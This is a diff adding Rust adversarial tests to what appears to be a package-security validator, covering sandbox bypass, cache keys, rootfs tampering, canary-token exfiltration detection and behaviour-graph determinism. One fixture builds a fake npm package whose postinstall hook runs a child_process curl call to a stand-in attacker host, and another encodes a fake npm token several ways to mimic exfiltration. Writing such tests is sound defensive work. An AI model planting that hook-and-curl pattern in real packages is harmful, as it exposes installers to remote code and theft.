@@ -457,3 +457,304 @@ fn concurrent_yara_zero_lock_contention() {
         handle.join().expect("scanner worker thread panicked");
     }
 }
+
+// ── ADR-018 Increment 4 Adversarial & Kernel Sandbox Tests (VNA-14..VNA-17) ──
+
+fn minimal_valid_wasm_ret0() -> Vec<u8> {
+    vec![
+        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version
+        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, // type () -> i32
+        0x03, 0x02, 0x01, 0x00, // func 0
+        0x07, 0x08, 0x01, 0x04, b'm', b'a', b'i', b'n', 0x00, 0x00, // export main
+        0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x00, 0x0b, // const 0; end
+    ]
+}
+
+#[tokio::test]
+async fn adv_dummy_wasm_bypass() {
+    let npm_pkg = PackageId::new("npm", "stealth-exfil-wasm", "1.0.0");
+    let dummy_wasm = minimal_valid_wasm_ret0();
+    let mixed_npm_tgz = make_tgz(&[
+        (
+            "package/package.json",
+            EntryType::Regular,
+            br#"{"name":"stealth-exfil-wasm","version":"1.0.0","scripts":{"postinstall":"node evil.js"}}"#,
+            None,
+        ),
+        (
+            "package/evil.js",
+            EntryType::Regular,
+            b"require('child_process').exec('curl https://evil.invalid');",
+            None,
+        ),
+        ("package/dummy.wasm", EntryType::Regular, &dummy_wasm, None),
+    ]);
+
+    assert!(
+        !validator::wasm_sandbox::is_standalone_wasm_package(&npm_pkg, &mixed_npm_tgz),
+        "mixed npm package with JS/postinstall + dummy .wasm MUST NOT enter Tier 3 WASM fallback"
+    );
+
+    let pure_wasm_pkg = PackageId::new("wasm", "pure-mod", "1.0.0");
+    let pure_wasm_tgz = make_tgz(&[
+        ("module.wasm", EntryType::Regular, &dummy_wasm, None),
+        ("README.md", EntryType::Regular, b"# Pure WASM\n", None),
+    ]);
+    assert!(
+        validator::wasm_sandbox::is_standalone_wasm_package(&pure_wasm_pkg, &pure_wasm_tgz),
+        "genuine standalone WASM package must be accepted by Tier 3"
+    );
+
+    // If CREG_DEV_SANDBOX is unset on a host without Firecracker/nsjail, mixed npm package fails closed.
+    if std::env::var("CREG_DEV_SANDBOX").is_err() {
+        let status = validator::sandbox::engine_status().await;
+        if !status.isolated {
+            assert!(
+                validator::sandbox::run(&npm_pkg, &mixed_npm_tgz, &PackageManifest::default())
+                    .await
+                    .is_err(),
+                "mixed npm+dummy.wasm package must fail closed without Tier 1/2 isolation"
+            );
+        }
+    }
+}
+
+#[test]
+fn adv_sandbox_cache_manifest_invalidation() {
+    let tgz = b"fixed-package-bytes";
+    let trigger = validator::kernel_sandbox::TriggerSpecV1::default();
+    let base_manifest = PackageManifest::default();
+
+    let key0 = validator::sandbox::compute_sandbox_cache_key(
+        tgz,
+        "npm",
+        &base_manifest,
+        "policy-v1",
+        &trigger,
+        120,
+        512,
+        &validator::sandbox::NetworkMode::ManifestOnly,
+    );
+
+    let mut escalated_manifest = base_manifest.clone();
+    escalated_manifest.allowed_fs_writes.push("/tmp/out".into());
+    escalated_manifest.allowed_process_spawns.push("sh".into());
+    let key_manifest = validator::sandbox::compute_sandbox_cache_key(
+        tgz,
+        "npm",
+        &escalated_manifest,
+        "policy-v1",
+        &trigger,
+        120,
+        512,
+        &validator::sandbox::NetworkMode::ManifestOnly,
+    );
+    assert_ne!(
+        key0, key_manifest,
+        "manifest permissions must invalidate cache key"
+    );
+
+    let key_policy = validator::sandbox::compute_sandbox_cache_key(
+        tgz,
+        "npm",
+        &base_manifest,
+        "policy-v2",
+        &trigger,
+        120,
+        512,
+        &validator::sandbox::NetworkMode::ManifestOnly,
+    );
+    assert_ne!(key0, key_policy, "policy bundle must invalidate cache key");
+
+    let mut alt_trigger = trigger;
+    alt_trigger
+        .env_overrides
+        .insert("NODE_ENV".into(), "production".into());
+    let key_trigger = validator::sandbox::compute_sandbox_cache_key(
+        tgz,
+        "npm",
+        &base_manifest,
+        "policy-v1",
+        &alt_trigger,
+        120,
+        512,
+        &validator::sandbox::NetworkMode::ManifestOnly,
+    );
+    assert_ne!(key0, key_trigger, "TriggerSpecV1 must invalidate cache key");
+}
+
+#[test]
+fn adv_rootfs_digest_tamper_fails_closed() {
+    let temp = tempfile::tempdir().unwrap();
+    let rootfs_base = temp.path();
+
+    // Missing rootfs must fail closed — never fall back to "/"
+    let missing_err = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
+        .unwrap_err()
+        .to_string();
+    assert!(missing_err.contains("KB-ROOTFS-DIGEST-MISMATCH"));
+
+    let npm_bin = rootfs_base.join("npm").join("bin");
+    std::fs::create_dir_all(&npm_bin).unwrap();
+    let node_bin = npm_bin.join("node");
+    std::fs::write(&node_bin, b"legitimate-alpine-node-binary").unwrap();
+    validator::kernel_sandbox::write_rootfs_digest_manifest(rootfs_base, &["npm"]).unwrap();
+
+    let verified = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
+        .expect("valid pinned rootfs must verify");
+    assert_eq!(verified.file_count, 1);
+
+    // Tamper 1 byte in rootfs binary
+    std::fs::write(&node_bin, b"trojanized-alpine-node-binary").unwrap();
+    let tamper_err = validator::kernel_sandbox::resolve_rootfs_strict(rootfs_base, "npm")
+        .unwrap_err()
+        .to_string();
+    assert!(
+        tamper_err.contains("KB-ROOTFS-DIGEST-MISMATCH"),
+        "tampered rootfs must fail with KB-ROOTFS-DIGEST-MISMATCH, got: {tamper_err}"
+    );
+}
+
+#[test]
+fn adv_canary_exfil_all_encodings() {
+    use base64::engine::general_purpose::{STANDARD, URL_SAFE_NO_PAD};
+    use base64::Engine as _;
+    use validator::kernel_sandbox::{
+        normalize_telemetry, CanaryChannel, CanaryEncoding, CanaryProfile, ExecutionTier,
+        TriggerSpecV1,
+    };
+
+    let profile = CanaryProfile::for_run(b"adversarial-canary-seed");
+    let token = profile.secrets[2].token.clone(); // npmrc_token
+
+    let raw_hits = profile.scan_payload(CanaryChannel::Stdout, token.as_bytes());
+    assert!(raw_hits.iter().any(|h| h.encoding == CanaryEncoding::Raw));
+
+    let b64_payload = STANDARD.encode(token.as_bytes());
+    let b64_hits = profile.scan_payload(CanaryChannel::NetworkPayload, b64_payload.as_bytes());
+    assert!(b64_hits
+        .iter()
+        .any(|h| h.encoding == CanaryEncoding::Base64));
+
+    let b64url_payload = URL_SAFE_NO_PAD.encode(token.as_bytes());
+    let b64url_hits =
+        profile.scan_payload(CanaryChannel::NetworkPayload, b64url_payload.as_bytes());
+    assert!(b64url_hits.iter().any(|h| matches!(
+        h.encoding,
+        CanaryEncoding::Base64Url | CanaryEncoding::Base64
+    )));
+
+    let hex_low = hex::encode(token.as_bytes());
+    assert!(profile
+        .scan_payload(CanaryChannel::NetworkPayload, hex_low.as_bytes())
+        .iter()
+        .any(|h| h.encoding == CanaryEncoding::HexLower));
+
+    let hex_up = hex::encode_upper(token.as_bytes());
+    assert!(profile
+        .scan_payload(CanaryChannel::NetworkPayload, hex_up.as_bytes())
+        .iter()
+        .any(|h| h.encoding == CanaryEncoding::HexUpper));
+
+    let url_enc = token.replace('_', "%5F");
+    let url_hits = profile.scan_payload(CanaryChannel::DnsQuery, url_enc.as_bytes());
+    assert!(url_hits
+        .iter()
+        .any(|h| h.encoding == CanaryEncoding::UrlEncoded));
+
+    let graph = normalize_telemetry(
+        ExecutionTier::Tier2Nsjail,
+        &TriggerSpecV1::default(),
+        &PackageManifest::default(),
+        &std::collections::HashSet::new(),
+        &[],
+        &[],
+        &[],
+        &b64_hits,
+    );
+    let findings = graph.into_findings();
+    assert!(findings
+        .iter()
+        .any(|f| f.id == "KB-CANARY-EXFIL" && f.severity == FindingSeverity::Critical));
+
+    let rep = ReputationAssessment {
+        confidence_delta: 0,
+        publisher_pubkey: "aa".repeat(32),
+        notes: Vec::new(),
+        revoked_pgp_fps: Vec::new(),
+    };
+    let pkg_id = PackageId::new("npm", "canary-leaker", "1.0.0");
+    let summary = RiskAggregator::default().summarize(
+        &pkg_id,
+        &findings,
+        100.0,
+        0.0,
+        100.0,
+        None,
+        &AnalysisBundleSet::default(),
+        &rep,
+    );
+    assert_eq!(summary.disposition, RiskDisposition::Block);
+}
+
+#[test]
+fn adv_kernel_behavior_graph_determinism() {
+    use validator::kernel_sandbox::{
+        normalize_telemetry, ExecutionTier, RawKernelEvent, TriggerSpecV1,
+    };
+
+    let trigger = TriggerSpecV1::default();
+    let manifest = PackageManifest {
+        allowed_fs_writes: vec!["/tmp/<run>/out".into()],
+        spawns_processes: true,
+        allowed_process_spawns: vec!["node".into()],
+        ..PackageManifest::default()
+    };
+    let ips = std::collections::HashSet::new();
+
+    let events_run1 = vec![
+        RawKernelEvent::OpenWrite {
+            path: "/tmp/creg-sandbox-11111111-2222-3333-4444-555555555555/out".into(),
+        },
+        RawKernelEvent::MemoryRwx {
+            kind: "mprotect_rwx".into(),
+            detail: "ptr=0x7f1122334455 pid=1001 ts=1700000001".into(),
+        },
+    ];
+    let events_run2 = vec![
+        RawKernelEvent::OpenWrite {
+            path: "/tmp/creg-sandbox-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee/out".into(),
+        },
+        RawKernelEvent::MemoryRwx {
+            kind: "mprotect_rwx".into(),
+            detail: "ptr=0x7f9988776655 pid=8842 ts=1799999999".into(),
+        },
+    ];
+
+    let g1 = normalize_telemetry(
+        ExecutionTier::Tier1Firecracker,
+        &trigger,
+        &manifest,
+        &ips,
+        &events_run1,
+        &[],
+        &[],
+        &[],
+    );
+    let g2 = normalize_telemetry(
+        ExecutionTier::Tier2Nsjail,
+        &trigger,
+        &manifest,
+        &ips,
+        &events_run2,
+        &[],
+        &[],
+        &[],
+    );
+
+    assert_eq!(
+        g1.canonical_digest(),
+        g2.canonical_digest(),
+        "volatile run UUIDs, ASLR addresses, PIDs, and timestamps must strip identically"
+    );
+}
